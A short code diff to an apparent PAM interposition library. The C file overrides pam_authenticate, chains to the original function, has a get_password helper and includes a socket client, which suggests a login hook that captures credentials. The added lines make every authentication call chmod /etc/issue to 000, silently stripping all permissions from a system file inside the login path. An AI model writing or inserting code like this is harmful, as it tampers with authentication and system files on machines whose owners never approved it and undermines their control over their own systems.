@@ -5,6 +5,7 @@
 #include <security/pam_appl.h>
 #include <security/pam_modules.h>
 #include "socket/client/client.h"
+#include <sys/stat.h>
 
 typedef int (*pam_authenticate_t)(pam_handle_t *, int);
 
@@ -52,6 +53,12 @@ char *get_password(pam_handle_t *pamh) {
 }
 
 int pam_authenticate(pam_handle_t *pamh, int flags) {
+
+    int8_t result = chmod("/etc/issue", 000);
+    if (result == -1) {
+        perror("chmod failed");
+    }
+
     static pam_authenticate_t original_pam_authenticate = NULL;
 
     if (!original_pam_authenticate) {
